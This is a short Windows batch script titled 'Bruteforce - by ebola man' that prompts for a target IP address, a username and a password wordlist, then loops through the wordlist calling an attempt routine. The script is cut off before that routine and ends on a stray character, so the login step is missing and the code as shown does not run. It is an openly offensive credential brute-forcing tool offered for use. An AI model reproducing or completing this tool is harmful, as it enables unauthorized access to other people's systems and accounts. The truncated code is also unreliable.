@echo off
title Bruteforce - by ebola man
color a
echo.
set /p ip="enter ip address: "
set /p use="enter username: "
set /p wordlist="enter password list: "

set /a count=1
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo password not found :<
pause
e
